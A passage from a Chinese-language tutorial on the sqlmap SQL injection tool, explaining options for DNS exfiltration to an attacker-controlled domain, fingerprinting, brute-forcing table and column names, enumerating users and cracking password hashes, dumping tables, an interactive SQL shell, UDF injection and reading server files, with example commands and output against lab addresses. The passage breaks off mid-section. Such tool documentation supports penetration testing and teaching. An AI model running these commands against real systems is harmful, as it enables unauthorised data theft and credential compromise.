<h3 id="6-DNS泄露攻击"><a href="#6-DNS泄露攻击" class="headerlink" title="6.DNS泄露攻击"></a>6.DNS泄露攻击</h3><p>参数：–dns-domain</p>
<p>SQL注入中的DNS泄露攻击详情见论文《Data Retrieval over DNS in SQL Injection Attacks》。</p>
<p>假设攻击者控制着某域名（例如：attacker.com）的域名解析服务器，即查询该域名的子域名对应的IP地址都会到这台域名解析服务器来查询。<br>这时攻击者就可以使用“–dns-domain attacker.com”来进行DNS泄露攻击。</p>
<p>实际上若是攻击者没有控制任何一台域名解析服务器，那么她可以注册一个新域名，再自己搭建一台域名解析服务器用于接受数据。</p>
<h3 id="7-二阶注入攻击"><a href="#7-二阶注入攻击" class="headerlink" title="7.二阶注入攻击"></a>7.二阶注入攻击</h3><p>参数：–second-order</p>
<p>有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面，该参数后跟一个URL。</p>
<h2 id="十、指纹"><a href="#十、指纹" class="headerlink" title="十、指纹"></a>十、指纹</h2><p>默认地Sqlmap会自动对注入目标进行数据库管理系统指纹识别。</p>
<p>参数：-f或–fingerprint</p>
<p>若想执行更广泛的数据库管理系统指纹识别可以添加此参数。</p>
<p>参数：-b或–banner</p>
<p>若想得到更精确的指纹识别结果可以添加此参数，详情见后文。</p>
<h2 id="十一、暴力破解"><a href="#十一、暴力破解" class="headerlink" title="十一、暴力破解"></a>十一、暴力破解</h2><h3 id="1-暴力破解表名"><a href="#1-暴力破解表名" class="headerlink" title="1.暴力破解表名"></a>1.暴力破解表名</h3><p>参数：–common-tables</p>
<p>有些情况下用“–tables”不能列出数据库中表名来，如：</p>
<ul>
<li>版本小于5.0的MySQL没有information_schema表</li>
<li>微软Access的MSysObjects表默认不可读</li>
<li>数据库用户权限过低无法读取表名</li>
</ul>
<p>当无法读出表名时可以使用参数“–common-tables”暴力破解表名。</p>
<p>该参数使用的字典是txt/common-tables.txt，其中存储了常见表名，可以手动编辑该文件。</p>
<h3 id="2-暴力破解列名"><a href="#2-暴力破解列名" class="headerlink" title="2.暴力破解列名"></a>2.暴力破解列名</h3><p>参数：–common-columns</p>
<p>有些情况下用“–columns”不能列出数据表中列名来，如：</p>
<ul>
<li>版本小于5.0的MySQL没有information_schema表</li>
<li>微软Access的MSysObjects表默认不可读</li>
<li>数据库用户权限过低无法读取列名</li>
</ul>
<p>当无法读出列名时可以使用参数“–common-columns”暴力破解列名。</p>
<p>该参数使用的字典是txt/common-columns.txt，其中存储了常见列名，可以手动编辑该文件。</p>
<h2 id="十二、列举数据"><a href="#十二、列举数据" class="headerlink" title="十二、列举数据"></a>十二、列举数据</h2><p>这些参数用于列举出数据库管理系统信息、数据结构和数据内容。</p>
<h3 id="1-一键列举全部数据"><a href="#1-一键列举全部数据" class="headerlink" title="1.一键列举全部数据"></a>1.一键列举全部数据</h3><p>参数：-a或–all</p>
<p>使用这一个参数就能列举所有可访问的数据。但不推荐使用，因为这会发送大量请求，把有用和无用的信息都列举出来。</p>
<h3 id="2-列举数据库管理系统信息"><a href="#2-列举数据库管理系统信息" class="headerlink" title="2.列举数据库管理系统信息"></a>2.列举数据库管理系统信息</h3><p>参数：-b或–banner</p>
<p>大多数的现代数据库管理系统都有一个函数或是环境变量能够返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。<br>通常这个函数是version()、环境变量是@@version，当然要看目标数据库管理系统了。使用参数“-b”或“–banner”来列举数据库管理系统的这一信息。</p>
<p>下例中的数据库是Oracle：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/oracle/get_int.php?id=1&quot; --banner</code></p>
<p>部分输出为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[09:54:30] [INFO] fetching banner</span><br><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: Oracle</span><br><span class="line">banner: &apos;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&apos;</span><br></pre></td></tr></table></figure>

<p>下例中的数据库是Mysql：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102/user.php?id=1&quot; --banner</code></p>
<p>部分输出为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[09:56:32] [INFO] fetching banner</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">banner:    &apos;5.5.50-0ubuntu0.14.04.1&apos;</span><br></pre></td></tr></table></figure>

<h3 id="3-列举当前用户"><a href="#3-列举当前用户" class="headerlink" title="3.列举当前用户"></a>3.列举当前用户</h3><p>参数：–current-user</p>
<p>使用这一参数有可能将执行SQL语句的用户列举出来。</p>
<h3 id="4-列举当前数据库"><a href="#4-列举当前数据库" class="headerlink" title="4.列举当前数据库"></a>4.列举当前数据库</h3><p>参数：–current-db</p>
<p>使用这一参数有可能将WEB应用连接的数据库名列举出来。</p>
<h3 id="5-列举服务器主机名"><a href="#5-列举服务器主机名" class="headerlink" title="5.列举服务器主机名"></a>5.列举服务器主机名</h3><p>参数：–hostname</p>
<p>使用这一参数有可能将数据库管理系统所在计算机的主机名列举出来，如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --hostname</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:04] [INFO] fetching server hostname</span><br><span class="line">[xx:xx:04] [INFO] retrieved: debian-5.0-i386</span><br><span class="line">hostname: &apos;debian-5.0-i386&apos;</span><br></pre></td></tr></table></figure>

<h3 id="6-检测当前用户是否是管理员"><a href="#6-检测当前用户是否是管理员" class="headerlink" title="6.检测当前用户是否是管理员"></a>6.检测当前用户是否是管理员</h3><p>参数：–is-dba</p>
<p>使用这一参数有可能能够检测当前用户是否是管理员，若是管理员则返回True，否则返回False。如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102/user.php?id=1&quot; --is-dba</code></p>
<p>部分输出为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[10:05:16] [INFO] testing if current user is DBA</span><br><span class="line">[10:05:16] [INFO] fetching current user</span><br><span class="line">[10:05:16] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">current user is DBA:    True</span><br></pre></td></tr></table></figure>

<h3 id="7-列举数据库管理系统中的用户"><a href="#7-列举数据库管理系统中的用户" class="headerlink" title="7.列举数据库管理系统中的用户"></a>7.列举数据库管理系统中的用户</h3><p>参数：–users</p>
<p>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中的用户。</p>
<h3 id="8-列举并破解数据库管理系统用户密码Hash值"><a href="#8-列举并破解数据库管理系统用户密码Hash值" class="headerlink" title="8.列举并破解数据库管理系统用户密码Hash值"></a>8.列举并破解数据库管理系统用户密码Hash值</h3><p>参数：–passwords</p>
<p>当前用户有读取包含了数据库管理系统中用户密码Hash值的系统表的权限时使用这一参数可以列举数据库管理系统中用户密码Hash值。<br>Sqlmap会先列举用户，再列举用户密码Hash值。</p>
<p>下面是一个以PostgreSQL为目标的例子：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --passwords -v 1</code></p>
<p>部分输出如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:38] [INFO] fetching database users password hashes</span><br><span class="line">do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y</span><br><span class="line">[hh:mm:42] [INFO] using hash method: &apos;postgres_passwd&apos;</span><br><span class="line">what&apos;s the dictionary&apos;s location? [/software/sqlmap/txt/wordlist.txt]</span><br><span class="line">[hh:mm:46] [INFO] loading dictionary from: &apos;/software/sqlmap/txt/wordlist.txt&apos;</span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N] n</span><br><span class="line">[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:49] [INFO] found: &apos;testpass&apos; for user: &apos;testuser&apos;</span><br><span class="line">[hh:mm:50] [INFO] found: &apos;testpass&apos; for user: &apos;postgres&apos;</span><br><span class="line">database management system users password hashes:</span><br><span class="line">[*] postgres [1]:</span><br><span class="line">  password hash: md5d7d880f96044b72d0bba108ace96d1e4</span><br><span class="line">  clear-text password: testpass</span><br><span class="line">[*] testuser [1]:</span><br><span class="line">  password hash: md599e5ea7a6f7c3269995cba3927fd0093</span><br><span class="line">  clear-text password: testpass</span><br></pre></td></tr></table></figure>

<p>Sqlmap不仅会列举出密码Hash，还会解析密码Hash格式，并询问用户是否要通过密码字典的方式破解Hash值寻找出明文密码。</p>
<p>若想只枚举特定用户的密码使用参数“-U”指定用户，可用“CU”来代表当前用户，如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102/user.php?id=1&quot; --password -U CU</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database management system users password hashes:</span><br><span class="line">[*] root [1]:</span><br><span class="line">    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">    clear-text password: root</span><br></pre></td></tr></table></figure>

<h3 id="9-列举数据库管理系统的用户权限"><a href="#9-列举数据库管理系统的用户权限" class="headerlink" title="9.列举数据库管理系统的用户权限"></a>9.列举数据库管理系统的用户权限</h3><p>参数：–privileges</p>
<p>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。</p>
<p>若想只枚举特定用户的权限使用参数“-U”指定用户，可用“CU”来代表当前用户。</p>
<p>若目标是微软的SQL Server，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。</p>
<h3 id="10-列举数据库管理系统的用户角色"><a href="#10-列举数据库管理系统的用户角色" class="headerlink" title="10.列举数据库管理系统的用户角色"></a>10.列举数据库管理系统的用户角色</h3><p>参数：–roles</p>
<p>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的角色。</p>
<p>若想只枚举特定用户的角色使用参数“-U”指定用户，可用“CU”来代表当前用户。</p>
<p>官方手册上说只有目标数据库管理系统是Oracle时这一功能才可用，但我在Mysql中测试也是可用的。</p>
<h3 id="11-列举数据库管理系统中的所有数据库"><a href="#11-列举数据库管理系统中的所有数据库" class="headerlink" title="11.列举数据库管理系统中的所有数据库"></a>11.列举数据库管理系统中的所有数据库</h3><p>参数：–dbs</p>
<p>当前用户有读取包含了数据库管理系统中可用数据库信息的系统表的权限时使用这一参数可以列举数据库管理系统中所有数据库。</p>
<h3 id="12-列举数据库数据库的所有表"><a href="#12-列举数据库数据库的所有表" class="headerlink" title="12.列举数据库数据库的所有表"></a>12.列举数据库数据库的所有表</h3><p>参数：–tables、–exclude–sysdbs和-D</p>
<p>当前用户有读取包含了数据库管理系统中可用数据库中数据表信息的系统表的权限时使用参数“–tables”可以列举用参数“-D”指定的数据库中的所有数据表。<br>若没有用参数“-D”指定数据库，只使用参数“–tables”会列举所有数据库中所有表。如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102/user.php?id=1&quot; -D DBName --tables</code></p>
<p>使用参数“–exclude-sysdbs”可排除系统数据库。在Oracle中要指定TABLESPACE_NAME而不是数据库名。</p>
<h3 id="13-列举数据表的所有列"><a href="#13-列举数据表的所有列" class="headerlink" title="13.列举数据表的所有列"></a>13.列举数据表的所有列</h3><p>参数：–columns、-C、-T和-D</p>
<p>如权限允许，使用参数“–columns”可以列出用“-D”指定的数据库中用“-T”指定的表中的所有列的名字和数据类型。</p>
<p>若没有指定数据库则会默认使用当前数据库。还可以用“-C”指定感兴趣的某几列这样就不用列出所有列来。</p>
<p>下面是以SQLite为目标的例子：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; --columns -D testdb -T users</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: SQLite_masterdb</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+---------+---------+</span><br><span class="line">| Column | Type     |</span><br><span class="line">+---------+---------+</span><br><span class="line">| id      | INTEGER |</span><br><span class="line">| name    | TEXT    |</span><br><span class="line">| surname | TEXT    |</span><br><span class="line">+---------+---------+</span><br></pre></td></tr></table></figure>

<p>在PostgreSQL中，数据库的名字一定是“public”或者是某个系统表<br>。因为在PostgreSQL中只能列举当前数据库或系统数据库中数据，而WEB应用连接的数据库别名总是“public”。</p>
<h2 id="十三、列举数据库管理系统的模式"><a href="#十三、列举数据库管理系统的模式" class="headerlink" title="十三、列举数据库管理系统的模式"></a>十三、列举数据库管理系统的模式</h2><p>参数：–schema和–exclude-sysdbs</p>
<p>用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。<br>同样地，可使用参数“–exclude-sysdbs”排除系统数据库。</p>
<p>下面是的例子测试对象是Mysql:</p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">Database: mysql</span><br><span class="line">Table: procs_priv</span><br><span class="line">[8 columns]</span><br><span class="line">+--------------+----------------------------------------+</span><br><span class="line">| Column       | Type                                   |</span><br><span class="line">+--------------+----------------------------------------+</span><br><span class="line">| Timestamp    | timestamp                              |</span><br><span class="line">| User         | char(16)                               |</span><br><span class="line">| Db           | char(64)                               |</span><br><span class="line">| Grantor      | char(77)                               |</span><br><span class="line">| Host         | char(60)                               |</span><br><span class="line">| Proc_priv    | set(&apos;Execute&apos;,&apos;Alter Routine&apos;,&apos;Grant&apos;) |</span><br><span class="line">| Routine_name | char(64)                               |</span><br><span class="line">| Routine_type | enum(&apos;FUNCTION&apos;,&apos;PROCEDURE&apos;)           |</span><br><span class="line">+--------------+----------------------------------------+</span><br><span class="line">[...]</span><br><span class="line">Database: mysql</span><br><span class="line">Table: ndb_binlog_index</span><br><span class="line">[7 columns]</span><br><span class="line">+-----------+---------------------+</span><br><span class="line">| Column    | Type                |</span><br><span class="line">+-----------+---------------------+</span><br><span class="line">| Position  | bigint(20) unsigned |</span><br><span class="line">| deletes   | bigint(20) unsigned |</span><br><span class="line">| epoch     | bigint(20) unsigned |</span><br><span class="line">| File      | varchar(255)        |</span><br><span class="line">| inserts   | bigint(20) unsigned |</span><br><span class="line">| schemaops | bigint(20) unsigned |</span><br><span class="line">| updates   | bigint(20) unsigned |</span><br><span class="line">+-----------+---------------------+</span><br></pre></td></tr></table></figure>

<h3 id="1-列举表中数据条数"><a href="#1-列举表中数据条数" class="headerlink" title="1.列举表中数据条数"></a>1.列举表中数据条数</h3><p>参数：–count</p>
<p>有时我们只想知道有多少数据而不想知道具体的数据内容，此时就可以使用该参数。如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot; --count -D testdb</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: testdb</span><br><span class="line">+----------------+---------+</span><br><span class="line">| Table          | Entries |</span><br><span class="line">+----------------+---------+</span><br><span class="line">| dbo.users      | 4       |</span><br><span class="line">| dbo.users_blob | 2       |</span><br><span class="line">+----------------+---------+</span><br></pre></td></tr></table></figure>

<h3 id="2-列举表中数据"><a href="#2-列举表中数据" class="headerlink" title="2.列举表中数据"></a>2.列举表中数据</h3><p>参数：–dump、-C、-T、-D、–start、–stop和–where</p>
<p>权限允许时可以列举表中数据。用参数“-D”指定数据库，用参数“-T”指定数据表，用参数“-C”指定目标列。<br>若只指定了数据表而没有指定数据库则默认使用当前数据库。若没有指定列则列举表中全部列。</p>
<p>下例是以Firebird为目标：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot; --dump -T users</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: Firebird_masterdb</span><br><span class="line">Table: USERS</span><br><span class="line">[4 entries]</span><br><span class="line">+----+--------+------------+</span><br><span class="line">| ID | NAME   | SURNAME    |</span><br><span class="line">+----+--------+------------+</span><br><span class="line">| 1 | luther | blisset     |</span><br><span class="line">| 2 | fluffy | bunny       |</span><br><span class="line">| 3 | wu     | ming        |</span><br><span class="line">| 4 | NULL   | nameisnull  |</span><br><span class="line">+---+--------+-------------+</span><br></pre></td></tr></table></figure>

<p>只使用参数“–dump”和“-D”可以一次性列举整个数据库中所有数据。</p>
<p>Sqlmap会自动将参数“–dump”列举的数据保存到CSV格式文件中，文件具体路径会在Sqlmap的输出中给出，如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; -D DSSchool --dump</code></p>
<p>部分输出为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[11:15:27] [INFO] analyzing table dump for possible password hashes</span><br><span class="line">Database: DSSchool</span><br><span class="line">Table: T_SCORESYSTEMTEACHERS</span><br><span class="line">[2 entries]</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">| AGE | NAME     | TITLE | ACCOUNT | PASSWORD |</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">| 21  | neo      | ??    | 001     | 001      |</span><br><span class="line">| 31  | morphine | ??    | 002     | 002      |</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line"></span><br><span class="line">[11:15:27] [INFO] table &apos;DSSchool.T_SCORESYSTEMTEACHERS&apos; dumped to CSV file &apos;/home/werner/.sqlmap/output/192.168.56.102/dump/DSSchool/T_SCORESYSTEMTEACHERS.csv&apos;</span><br></pre></td></tr></table></figure>

<p>截取的输出中最后一行便是CSV文件保存的路径。</p>
<p>若只想列举部分数据可以使用参数“–start”和“–stop”。如只想列举第一条数据可以添加“–stop 1”，<br>只想列举第二和第三条数据可以添加“–start 1 –stop 3”，可见这是一个左开右闭区间。<br>区间范围仅在盲注中有效，因为在基于错误信息的注入和联合查询注入中区间范围会被忽略。</p>
<p>除了用区间范围限制列举的数据外，还可以用“–where”参数来限制列举的数据。<br>“–where”参数会被Sqlmap转换成WHERE子句，如“–where id&gt;3”会只列举列id的值大于3的数据。</p>
<p>如你所见，Sqlmap十分灵活。可以囫囵地列举整个数据库，也可以细致地在表中选择列，在列中又选择特定数据。</p>
<h3 id="3-列举所有数据库所有表中所有数据"><a href="#3-列举所有数据库所有表中所有数据" class="headerlink" title="3.列举所有数据库所有表中所有数据"></a>3.列举所有数据库所有表中所有数据</h3><p>参数：–dump-all和–exclude-sysdbs</p>
<p>使用参数“–dump-all”可列举所有数据库所有表中所有数据。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。</p>
<p>注意微软SQL Server的master数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据。</p>
<h3 id="4-在数据库、表、列中搜索"><a href="#4-在数据库、表、列中搜索" class="headerlink" title="4.在数据库、表、列中搜索"></a>4.在数据库、表、列中搜索</h3><p>参数：–search、-C、-T和-D</p>
<p>可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。</p>
<p>参数“–search”要和下列参数之一配合使用：</p>
<p>-C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索<br>-T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索<br>-D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索<br>在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。<br>默认为包含搜索，即搜索的字符串包含于结果中就认为命中。<br>精确搜索要求搜索的字符串与结果完全相等。</p>
<h3 id="5-运行自定义的SQL语句"><a href="#5-运行自定义的SQL语句" class="headerlink" title="5.运行自定义的SQL语句"></a>5.运行自定义的SQL语句</h3><p>参数：–sql-query和–sql-shell</p>
<p>这一功能允许执行任意的SQL语句，Sqlmap会自动解析给出的SQL语句，选择恰当的注入技术并将给出的SQL语句打包到payload中。</p>
<p>如果查询是个SELECT语句，Sqlmap会返回查询结果。如果Web应用使用的数据库管理系统支持多语句查询，Sqlmap会使用堆注入技术。<br>但要注意Web应用可能不支持堆查询，例如PHP使用Mysql时不支持堆查询，但使用PostgreSQL时支持堆查询。</p>
<p>下例的目标是SQL Server 2000：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#39;foo&#39;&quot; -v 1</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:14] [INFO] fetching SQL SELECT query output: &apos;SELECT &apos;foo&apos;&apos;</span><br><span class="line">[hh:mm:14] [INFO] retrieved: foo</span><br><span class="line">SELECT &apos;foo&apos;:</span><br><span class="line">&apos;foo&apos;</span><br></pre></td></tr></table></figure>

<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#39;foo&#39;, &#39;bar&#39;&quot; -v 2</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:50] [INFO] fetching SQL SELECT query output: &apos;SELECT &apos;foo&apos;, &apos;bar&apos;&apos;</span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now</span><br><span class="line">unpack it into distinct queries to be able to retrieve the output even if we are</span><br><span class="line">going blind</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS</span><br><span class="line">VARCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA</span><br><span class="line">RCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 quer</span><br></pre></td></tr></table></figure>

<p>如你所见，Sqlmap将提供的SQL语句分成了两个不同的SELECT语句，并分别返回结果。</p>
<p>参数“–sql-shell”提供一个交互式的SQL语句执行环境，支持Tab键补全和命令历史记录。如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102/user.php?id=1&quot; --sql-shell</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[15:06:47] [INFO] calling MySQL shell. To quit type &apos;x&apos; or &apos;q&apos; and press ENTER</span><br><span class="line">sql-shell&gt; select &apos;foo&apos;;</span><br><span class="line">[15:07:41] [INFO] fetching SQL SELECT statement query output: &apos;select &apos;foo&apos;&apos;</span><br><span class="line">select &apos;foo&apos;;:    &apos;foo&apos;</span><br><span class="line">sql-shell&gt; select password from mysql.user where user=&apos;root&apos;;</span><br><span class="line">[15:07:42] [INFO] fetching SQL SELECT statement query output: &apos;select password from mysql.user where user=&apos;root&apos;&apos;</span><br><span class="line">select password from mysql.user where user=&apos;root&apos;; [1]:</span><br><span class="line">[*] *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">sql-shell&gt; show tables;</span><br><span class="line">[15:11:15] [INFO] fetching SQL SELECT statement query output: &apos;show tables&apos;</span><br><span class="line">[15:11:15] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)</span><br><span class="line">show tables; [1]:</span><br></pre></td></tr></table></figure>

<h2 id="十四、UDF注入"><a href="#十四、UDF注入" class="headerlink" title="十四、UDF注入"></a>十四、UDF注入</h2><p>参数：–udf-inject</p>
<p>UDF是“user-defined function”的缩写，UDF是一种针对MySQL和PostgreSQL的高级注入技术，详情见《Advanced SQL injection to operating system full control》。</p>
<p>可以编译MySQL或PostgreSQL的共享库、DLL（Windows）和共享对象（Linux/Unix）并将这些文件在本机上的路径提供给Sqlmap来进行UDF注入。<br>Sqlmap会先问一些问题然后上传UDF文件并创建UDF最后根据问题答案执行UDF。完成UDF注入后，Sqlmap会删除上传的UDF文件。</p>
<p>参数：–shared-lib</p>
<p>添加此参数Sqlmap会在运行时询问共享库文件路径。</p>
<p>在Sqlmap安装目录的udf目录中有许多UDF文件，按照DMBS、操作系统、位数和版本归类，可以直接使用。</p>
<h2 id="十五、访问文件系统"><a href="#十五、访问文件系统" class="headerlink" title="十五、访问文件系统"></a>十五、访问文件系统</h2><h3 id="1-读取文件"><a href="#1-读取文件" class="headerlink" title="1.读取文件"></a>1.读取文件</h3><p>参数：–file-read</p>
<p>当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有读取文件相关权限时读取文件是可行的。<br>读取的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是SQL Server 2005：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot; --file-read &quot;C:/example.exe&quot; -v 1</code></p>
<p>部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2000</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line">[hh:mm:50] [INFO] fetching file: &apos;C:/example.exe&apos;</span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided returns 3 entries</span><br><span class="line">C:/example.exe file saved to:</span><br><span class="line">&apos;/software/sqlmap/output/192.168.136.129/files/C__example.exe&apos;</span><br></pre></td></tr></table></figure>

<p>然后查看下载的文件：</p>
